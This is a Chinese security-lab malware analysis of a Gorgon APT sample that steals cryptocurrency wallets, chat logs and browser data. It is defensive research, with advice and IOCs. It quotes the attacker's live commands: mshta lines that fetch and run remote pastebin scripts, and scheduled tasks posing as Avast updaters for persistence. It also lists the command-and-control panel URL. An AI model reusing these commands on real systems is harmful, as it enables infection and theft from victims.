## 背景

 **Gorgon APT组织是一个被认为来自 **巴基斯坦** 的攻击组织，该组织在2018年8月份由Palo Alto
Unit42团队进行披露，主要针对全球外贸人士进行攻击。除此之外，安全研究人员还发现Gorgon针对英国、西班牙、俄罗斯、美国等政府目标发起了攻击，算是APT组织的后起之秀，最近一年非常活跃。**

近日，深信服安全团队发现了Gorgon APT组织最新变种样本，此样本释放了一个盗取受害者虚拟币钱包的木马。

![](https://image.3001.net/images/20190918/1568771866_5d818f1aca5b4.png!small)

/攻击流程图/

## 样本分析

1.样本中包含恶意的宏代码，如下所示：

![](https://image.3001.net/images/20190918/1568771872_5d818f205090f.png!small)

2.通过动态调试，宏代码调用mshta.exe执行mshta<http://bitly.com/6xdfsSXsh6>，访问短链接网址<http://bitly.com/6xdfsSXsh6,>如下所示：

![](https://image.3001.net/images/20190918/1568771876_5d818f24a55b5.png!small)

3.短链接跳转到网站：<https://sxasxasxssaxxsasxasx.blogspot.com/p/don-bigi.html>，网站包含恶意脚本，如下所示：

![](https://image.3001.net/images/20190918/1568771881_5d818f297bbff.png!small)

4.解密里面的恶意脚本，如下所示：

![](https://image.3001.net/images/20190918/1568771885_5d818f2dbc46a.png!small)

5.调用mshta.exe执行mshta.exe
<http://www.pastebin.com/raw/UZEbWMK9>，访问<http://www.pastebin.com/raw/UZEbWMK9>网站的内容，如下所示：

![](https://image.3001.net/images/20190918/1568771890_5d818f32762c2.png!small)

6.解密上面的恶意脚本内容，如下所示：

![](https://image.3001.net/images/20190918/1568771893_5d818f35b87c6.png!small)

7.调用cmd.exe程序，执行如下命令，结束相关进程:

    
    
    "C:\Windows\System32\cmd.exe" /c taskkill /f /im winword.exe & taskkill /f /im excel.exe & taskkill /f /im MSPUB.exe & taskkill /f /im POWERPNT.EXE & exit

8.将以下命令，写入自启动注册表项：

    
    
    mshta.exe<http://pastebin.com/raw/hJjQuQv1>

[](http://pastebin.com/raw/hJjQuQv1)

9.通过命令，创建两个计划任务启动项Avast Updater和Avast backup，如下所示：

    
    
    "C:\Windows\System32\schtasks.exe" /create /sc MINUTE /mo 30 /tn "Avast Updater" /tr "mshta.exe<http://pastebin.com/raw/BrH6UFRc>" /F
    
    "C:\Windows\System32\schtasks.exe" /create /sc MINUTE /mo 300 /tn "Avast backup" /tr "mshta.exe<http://pastebin.com/raw/nhcP3XgH>" /F

10.上面三个自启动项，分别执行三个不同的脚本，如下所示：

[](http://pastebin.com/raw/hJjQuQv1)

    
    
    <http://pastebin.com/raw/hJjQuQv1>
    
    <http://pastebin.com/raw/BrH6UFRc>
    
    <http://pastebin.com/raw/nhcP3XgH>

[](http://pastebin.com/raw/nhcP3XgH)

hJjQuQv1脚本解密之后，如下所示：

![](https://image.3001.net/images/20190918/1568771897_5d818f39ae5a3.png!small)

BrH6UFRc脚本解密之后，如下所示：

![](https://image.3001.net/images/20190918/1568771901_5d818f3d49c12.png!small)

再次解密脚本，如下所示：

![](https://image.3001.net/images/20190918/1568771907_5d818f435f1d5.png!small)

11.下载<https://pastebin.com/raw/dkrjWec2>脚本并执行，脚本内容，如下所示：

![](https://image.3001.net/images/20190918/1568771910_5d818f46d8555.png!small)

解密脚本之后，如下所示：

![](https://image.3001.net/images/20190918/1568771915_5d818f4b34732.png!small)

12.解密之后替换里面的字符串，然后加载执行，如下所示：

![](https://image.3001.net/images/20190918/1568771918_5d818f4e09e75.png!small)

13.替换之后，是一个PE文件，如下所示：

![](https://image.3001.net/images/20190918/1568771922_5d818f528408b.png!small)

14.通过查看这个PE文件为NET编写的注入程序，如下所示：

![](https://image.3001.net/images/20190918/1568771926_5d818f569feda.png!small)

15.将PE程序注入到calc.exe进程中，下载<https://pastebin.com/raw/j8mRken0>脚本内容，然后替换里面的@!并执行，脚本内容，如下所示：

![](https://image.3001.net/images/20190918/1568771929_5d818f5987a6a.png!small)

16.解密脚本之后也是一个PE文件，如下所示：

![](https://image.3001.net/images/20190918/1568771932_5d818f5cd07ac.png!small)

17.把这个解密出来的PE程序通过上面解密出来的PE注入程序，注入到calc.exe进程中，此PE程序，盗取受害者虚拟钱包数据，例如比特币，莱特币等，如下所示：

![](https://image.3001.net/images/20190918/1568771985_5d818f91536ee.png!small)

18.盗取受害者聊天工具记录，例如：Skype、Telegram等，如下所示：

![](https://image.3001.net/images/20190918/1568771982_5d818f8e09337.png!small)

19.屏幕截图操作，如下所示：

![](https://image.3001.net/images/20190918/1568771978_5d818f8a0c79c.png!small)

20.获取受害者主机相关信息，当前IP地址或区域信息以及磁盘文件名等，如下所示：

![](https://image.3001.net/images/20190918/1568771975_5d818f87650a7.png!small)

21.盗取受害者浏览器历史记录信息等，如下所示：

![](https://image.3001.net/images/20190918/1568771971_5d818f835c7b7.png!small)

22.远程服务器URL：<http://216.170.126.139/Panel/10/index.php>，捕获到的数据包流量，如下所示：

![](https://image.3001.net/images/20190918/1568771966_5d818f7e2c111.png!small)

23.nhcP3XgH脚本解密之后，如下所示：

![](https://image.3001.net/images/20190918/1568771955_5d818f735d77d.png!small)

## 安全建议：

不管攻击者的入侵计划是多么的缜密，总会由于技术的限制留下些许蛛丝马迹，譬如软件的植入、网络流量的产生，这些痕迹可能并不足以作为APT攻击的证据，但一旦发现，就必须提高警惕，并及时的保存现场，通知安全相关人员，对疑似感染的主机进行隔离和检查。同时也要注意日常防范措施，在思想上和技术上双管齐下：

> 1、加强人员安全防范意识。不要打开来历不明的邮件附件，对于邮件附件中的文件要谨慎运行，如发现脚本或其他可执行文件可先使用杀毒软件进行扫描；
>
> 2、升级office系列软件到最新版本，不要随意运行不可信文档中的宏；
>
>
> 3、部署分层控制，实现深度网络安全防御，构建端到端的立体安全防护网络。在网络规划时需要充分考虑终端接入安全、内网安全防护、应用系统安全等多个维度，并根据不同的业务需求和安全等级进行合理的分区隔离；
>
>
> 4、重视网络数据、系统运行状态的审计和分析。严格把控系统的访问权限，持续对数据流的进出进行有效的监控，及时更新安全补丁，定时进行安全配置基线的审视和系统安全风险的评估，及时发现可以行为并通过通信线路加密、应用层安全扫描与防护、隔离等有效技术手段将可能的安全风险扼杀在摇篮里。

## IOCs

### MD5:

> A137185171B1176FC125A74250928933
>
> A5DE91F73A5E75AA7E33954FD0ADDA13
>
> E0CE8A86F85C506591BE8897C07FB626

### URL：

> <http://bitly.com/6xdfsSXsh6>
>
> <https://sxasxasxssaxxsasxasx.blogspot.com/p/don-bigi.html>
>
> <http://www.pastebin.com/raw/UZEbWMK9>
>
> <http://pastebin.com/raw/hJjQuQv1>
>
> <http://pastebin.com/raw/BrH6UFRc>
>
> <http://pastebin.com/raw/nhcP3XgH>
>
> <http://216.170.126.139/Panel/10/index.php>

### IP ：

> 216.170.126.139

 ***本文作者：深信服千里目安全实验室，转载请注明来自FreeBuf.COM**

